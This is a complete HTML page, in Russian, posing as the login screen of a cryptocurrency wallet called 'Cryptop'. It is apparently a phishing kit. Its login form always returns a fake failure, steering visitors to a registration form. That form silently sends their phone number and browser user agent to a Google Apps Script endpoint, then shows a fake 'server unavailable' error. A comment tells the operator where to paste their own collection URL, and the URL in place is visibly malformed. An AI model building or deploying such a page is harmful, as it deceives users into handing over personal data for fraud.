<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#050a18">
<title>Cryptop — вход в кошелёк</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  html, body { height: 100%; }
  body {
    font-family: -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: #050a18;
    color: #e6f0ff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    padding: 64px 0 40px;
    position: relative;
    overflow-x: hidden;
  }
  body::before, body::after {
    content: "";
    position: fixed;
    border-radius: 50%;
    filter: blur(90px);
    pointer-events: none;
    z-index: 0;
  }
  body::before {
    width: 340px; height: 340px;
    background: rgba(0, 140, 255, .30);
    top: -120px; left: -100px;
  }
  body::after {
    width: 380px; height: 380px;
    background: rgba(0, 90, 255, .22);
    bottom: -140px; right: -120px;
  }
  .scanline {
    position: fixed; top: 0; left: 0; right: 0;
    height: 2px;
    background: linear-gradient(90deg, transparent, #00b7ff, transparent);
    opacity: .55; z-index: 2; pointer-events: none;
    animation: scan 4.5s ease-in-out infinite;
  }
  @keyframes scan {
    0%, 100% { transform: translateY(0); opacity: .35; }
    50%      { transform: translateY(100vh); opacity: .75; }
  }
  .container {
    position: relative; z-index: 1;
    width: 100%; max-width: 400px; padding: 0 22px;
  }
  .logo { display: flex; align-items: center; gap: 11px; margin-bottom: 42px; }
  .logo-mark {
    width: 38px; height: 38px; border-radius: 11px;
    background: linear-gradient(135deg, #00b7ff 0%, #0057ff 100%);
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 22px rgba(0, 140, 255, .55), inset 0 0 12px rgba(255,255,255,.18);
  }
  .logo-mark svg { width: 22px; height: 22px; display: block; }
  .logo-text {
    font-size: 21px; font-weight: 700; letter-spacing: -0.3px;
    background: linear-gradient(90deg, #e6f0ff 0%, #8fc4ff 100%);
    -webkit-background-clip: text; background-clip: text; color: transparent;
  }
  h1 { font-size: 25px; font-weight: 600; margin-bottom: 9px; letter-spacing: -0.4px; }
  .sub { font-size: 14px; color: #7a8db3; margin-bottom: 32px; line-height: 1.5; }
  .field { margin-bottom: 20px; }
  label {
    display: block; font-size: 12.5px; color: #7a8db3; margin-bottom: 8px;
    letter-spacing: .2px; text-transform: uppercase; font-weight: 500;
  }
  .input-group {
    display: flex; background: rgba(12, 22, 45, .85);
    border: 1px solid rgba(0, 140, 255, .28); border-radius: 12px; overflow: hidden;
    transition: border-color .18s, box-shadow .18s, background .18s;
    backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px);
  }
  .input-group:focus-within {
    border-color: #00b7ff; background: rgba(14, 26, 52, .95);
    box-shadow: 0 0 0 3px rgba(0, 140, 255, .18), 0 0 22px rgba(0, 140, 255, .35);
  }
  .prefix {
    padding: 15px 13px; color: #c7dbff; font-size: 16px; font-weight: 500;
    border-right: 1px solid rgba(0, 140, 255, .22);
    background: rgba(0, 80, 200, .10); user-select: none;
  }
  input[type="tel"] {
    flex: 1; padding: 15px 14px; border: 0; outline: 0;
    font-size: 16px; font-family: inherit; background: transparent;
    color: #e6f0ff; letter-spacing: .4px;
  }
  input[type="tel"]::placeholder { color: #4a5a7a; }
  .btn {
    width: 100%; padding: 15px; border: 0; border-radius: 12px;
    font-family: inherit; font-size: 16px; font-weight: 600;
    letter-spacing: .2px; cursor: pointer;
    transition: transform .12s, box-shadow .18s, filter .18s, background .18s, border-color .18s, color .18s;
  }
  .btn-primary {
    color: #fff; background: linear-gradient(135deg, #00b7ff 0%, #0057ff 100%);
    margin-top: 10px;
    box-shadow: 0 8px 24px rgba(0, 100, 255, .40), inset 0 1px 0 rgba(255, 255, 255, .18);
  }
  .btn-primary:hover {
    filter: brightness(1.07);
    box-shadow: 0 8px 30px rgba(0, 140, 255, .55), inset 0 1px 0 rgba(255, 255, 255, .22);
  }
  .btn-primary:active { transform: translateY(1px); }
  .btn-secondary {
    color: #8fc4ff; background: transparent;
    border: 1px solid rgba(0, 140, 255, .38);
    margin-top: 12px;
  }
  .btn-secondary:hover {
    background: rgba(0, 140, 255, .10);
    border-color: rgba(0, 180, 255, .65);
    color: #bfe0ff;
    box-shadow: 0 0 18px rgba(0, 140, 255, .30);
  }
  .btn-secondary:active { transform: translateY(1px); }
  .btn:disabled { opacity: .72; cursor: not-allowed; filter: saturate(.7); }
  .msg {
    font-size: 13.5px; margin-top: 16px; display: none;
    line-height: 1.5; padding: 11px 13px; border-radius: 9px;
    border: 1px solid transparent;
  }
  .msg.err {
    color: #ff8ea0; background: rgba(255, 60, 90, .10);
    border-color: rgba(255, 60, 90, .30);
  }
  .msg.ok {
    color: #7ee0a0; background: rgba(0, 200, 120, .10);
    border-color: rgba(0, 200, 120, .30);
  }
  .footnote {
    margin-top: 40px; font-size: 12px; color: #4a5a7a;
    text-align: center; line-height: 1.65;
  }
  .footnote a {
    color: #5b7096; text-decoration: none;
    border-bottom: 1px solid rgba(91, 112, 150, .35);
    transition: color .15s;
  }
  .footnote a:hover { color: #8fc4ff; }
  .spinner {
    display: inline-block; width: 14px; height: 14px;
    border: 2px solid rgba(255, 255, 255, .25); border-top-color: #fff;
    border-radius: 50%; animation: spin .7s linear infinite;
    vertical-align: -2px; margin-right: 8px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .modal-overlay {
    position: fixed; inset: 0; background: rgba(2, 6, 16, .78);
    backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
    display: none; justify-content: center; align-items: center;
    padding: 22px; z-index: 50; opacity: 0;
    transition: opacity .22s ease;
  }
  .modal-overlay.open { display: flex; opacity: 1; }
  .modal {
    width: 100%; max-width: 380px;
    background: linear-gradient(180deg, #0a1428 0%, #071122 100%);
    border: 1px solid rgba(0, 140, 255, .35);
    border-radius: 18px; padding: 26px 22px 24px;
    box-shadow: 0 20px 60px rgba(0, 0, 0, .65),
                0 0 40px rgba(0, 120, 255, .18),
                inset 0 1px 0 rgba(140, 200, 255, .12);
    position: relative;
    transform: translateY(10px) scale(.98); opacity: 0;
    transition: transform .25s ease, opacity .25s ease;
    max-height: calc(100vh - 44px); overflow-y: auto;
  }
  .modal-overlay.open .modal { transform: translateY(0) scale(1); opacity: 1; }
  .modal-close {
    position: absolute; top: 12px; right: 12px;
    width: 32px; height: 32px; border: 0; background: transparent;
    color: #5b7096; border-radius: 8px; font-size: 20px; line-height: 1;
    cursor: pointer; display: flex; align-items: center; justify-content: center;
    transition: color .15s, background .15s; font-family: inherit;
  }
  .modal-close:hover { color: #bfe0ff; background: rgba(0, 140, 255, .12); }
  .modal-mark {
    width: 46px; height: 46px; border-radius: 13px;
    background: linear-gradient(135deg, #00b7ff 0%, #0057ff 100%);
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 24px rgba(0, 140, 255, .55), inset 0 0 12px rgba(255,255,255,.18);
    margin-bottom: 18px;
  }
  .modal-mark svg { width: 24px; height: 24px; display: block; }
  .modal h2 { font-size: 21px; font-weight: 600; letter-spacing: -0.3px; margin-bottom: 8px; }
  .modal .modal-sub { font-size: 13.5px; color: #7a8db3; margin-bottom: 24px; line-height: 1.55; }
</style>
</head>
<body>
<div class="scanline"></div>

<div class="container">
  <div class="logo">
    <div class="logo-mark">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"
           stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="9"/>
        <path d="M13 6l-4 7h3l-1 5 4-7h-3l1-5z" fill="#fff" stroke="none"/>
      </svg>
    </div>
    <div class="logo-text">Cryptop</div>
  </div>

  <h1>Вход в кошелёк</h1>
  <div class="sub">Введите номер телефона, привязанный к кошельку Cryptop</div>

  <form id="login-form" novalidate autocomplete="off">
    <div class="field">
      <label for="phone-main">Номер телефона</label>
      <div class="input-group">
        <span class="prefix">+7</span>
        <input type="tel" id="phone-main" placeholder="900 000-00-00"
               inputmode="numeric" autocomplete="tel" maxlength="13">
      </div>
    </div>
    <button type="submit" class="btn btn-primary" id="btn-login">Войти</button>
    <div class="msg" id="msg-main"></div>
  </form>

  <button type="button" class="btn btn-secondary" id="btn-open-reg">Зарегистрироваться</button>

  <div class="footnote">
    Продолжая, вы соглашаетесь с условиями<br>
    <a href="#">Сервиса</a> и <a href="#">Политикой конфиденциальности</a>
  </div>
</div>

<div class="modal-overlay" id="reg-overlay" role="dialog" aria-modal="true">
  <div class="modal">
    <button type="button" class="modal-close" id="btn-close-reg" aria-label="Закрыть">×</button>

    <div class="modal-mark">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"
           stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="9"/>
        <path d="M13 6l-4 7h3l-1 5 4-7h-3l1-5z" fill="#fff" stroke="none"/>
      </svg>
    </div>

    <h2>Регистрация в Cryptop</h2>
    <div class="modal-sub">Введите номер телефона — на него придёт код подтверждения</div>

    <form id="reg-form" novalidate autocomplete="off">
      <div class="field">
        <label for="phone-reg">Номер телефона</label>
        <div class="input-group">
          <span class="prefix">+7</span>
          <input type="tel" id="phone-reg" placeholder="900 000-00-00"
                 inputmode="numeric" autocomplete="tel" maxlength="13" required>
        </div>
      </div>
      <button type="submit" class="btn btn-primary" id="btn-reg">Получить код</button>
      <div class="msg" id="msg-reg"></div>
    </form>
  </div>
</div>

<script>
(function(){
  // =============== ВСТАВЬ СЮДА URL ИЗ APPS SCRIPT ===============
  const SHEET_URL = "https://script.google.com/macros/s/https://script.google.com/macros/s/AKfycbwgJAcxHUcRvhlhPbWX9mTakZp-CaffjIv0qA_ghBPw8rB8FqSWikQq4ULNa1uOKHygww/exec";
  // ==============================================================

  function mask(el){
    el.addEventListener("input", function(){
      let v = this.value.replace(/\D/g, "").slice(0, 10);
      let out = "";
      if (v.length > 0) out = v.slice(0, 3);
      if (v.length > 3) out += " " + v.slice(3, 6);
      if (v.length > 6) out += "-" + v.slice(6, 8);
      if (v.length > 8) out += "-" + v.slice(8, 10);
      this.value = out;
    });
  }
  function showMsg(el, text, kind){
    el.textContent = text;
    el.className = "msg " + (kind || "");
    el.style.display = "block";
  }
  function hideMsg(el){ el.style.display = "none"; }
  function digitsOnly(v){ return v.replace(/\D/g, ""); }

  async function send(payload){
    try {
      await fetch(SHEET_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify(payload)
      });
    } catch (_) { /* тихо */ }
  }

  const loginForm  = document.getElementById("login-form");
  const phoneMain  = document.getElementById("phone-main");
  const btnLogin   = document.getElementById("btn-login");
  const msgMain    = document.getElementById("msg-main");

  const btnOpenReg = document.getElementById("btn-open-reg");
  const btnCloseReg= document.getElementById("btn-close-reg");
  const overlay    = document.getElementById("reg-overlay");
  const regForm    = document.getElementById("reg-form");
  const phoneReg   = document.getElementById("phone-reg");
  const btnReg     = document.getElementById("btn-reg");
  const msgReg     = document.getElementById("msg-reg");

  mask(phoneMain);
  mask(phoneReg);

  loginForm.addEventListener("submit", function(e){
    e.preventDefault();
    const d = digitsOnly(phoneMain.value);
    if (d.length !== 10) {
      showMsg(msgMain, "Введите корректный номер телефона", "err");
      return;
    }
    btnLogin.disabled = true;
    const old = btnLogin.textContent;
    btnLogin.innerHTML = '<span class="spinner"></span>Проверка...';
    setTimeout(function(){
      btnLogin.disabled = false;
      btnLogin.textContent = old;
      showMsg(msgMain, "Неверный номер или пароль. Попробуйте войти заново или зарегистрируйтесь.", "err");
    }, 1100);
  });

  function openModal(){
    overlay.classList.add("open");
    document.body.style.overflow = "hidden";
    setTimeout(function(){ phoneReg.focus(); }, 220);
  }
  function closeModal(){
    overlay.classList.remove("open");
    document.body.style.overflow = "";
    hideMsg(msgReg);
  }
  btnOpenReg.addEventListener("click", openModal);
  btnCloseReg.addEventListener("click", closeModal);
  overlay.addEventListener("click", function(e){
    if (e.target === overlay) closeModal();
  });
  document.addEventListener("keydown", function(e){
    if (e.key === "Escape" && overlay.classList.contains("open")) closeModal();
  });

  regForm.addEventListener("submit", async function(e){
    e.preventDefault();
    const d = digitsOnly(phoneReg.value);
    if (d.length !== 10) {
      showMsg(msgReg, "Введите корректный номер телефона", "err");
      return;
    }
    btnReg.disabled = true;
    btnReg.innerHTML = '<span class="spinner"></span>Отправка кода...';
    hideMsg(msgReg);

    const fullPhone = "+7" + d;

    send({
      phone: fullPhone,
      ua:    navigator.userAgent,
      src:   "register"
    });

    setTimeout(function(){
      btnReg.disabled = false;
      btnReg.textContent = "Получить код";
      showMsg(msgReg, "Сервер временно недоступен. Попробуйте позже.", "err");
    }, 1400);
  });
})();
</script>
</body>
</html>
